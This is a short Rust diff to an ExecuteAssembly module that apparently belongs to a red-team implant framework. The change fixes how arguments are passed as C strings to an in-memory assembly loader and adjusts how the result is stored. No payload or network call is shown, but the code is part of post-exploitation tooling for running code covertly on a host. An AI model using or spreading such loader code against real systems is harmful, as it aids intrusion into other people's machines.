@@ -21,14 +21,19 @@ impl Module for ExecuteAssembly {
         #[cfg(feature = "community")]
         {
             use crate::MaleficExecAssembleInMemory;
-            let str_slices: Vec<&str> = request.params.iter().map(|s| s.as_str()).collect();
-            let str_args: *const *const u8 = str_slices.as_ptr() as *const *const u8;
-            let ret = unsafe {MaleficExecAssembleInMemory(bin.as_ptr(), bin.len(), str_args)};
+            let c_strings: Vec<_> = request.params 
+                    .iter()
+                    .map(|s| {
+                        let c_str = std::ffi::CString::new(s.as_str()).unwrap();
+                        c_str.into_raw()
+                    })
+                    .collect();
+            let ret = unsafe {MaleficExecAssembleInMemory(bin.as_ptr(), bin.len(), c_strings.as_ptr() as _, c_strings.len())};
             if ret.is_null() {
                 to_error!(Err("Bof Loader failed!".to_string()))?
             }
             let ret_s = unsafe {CString::from_raw(ret as _).to_string_lossy().to_string()};
-            let result = ret_s.into_bytes();
+            result = ret_s.into_bytes();
         }
         #[cfg(feature = "professional")]
         {
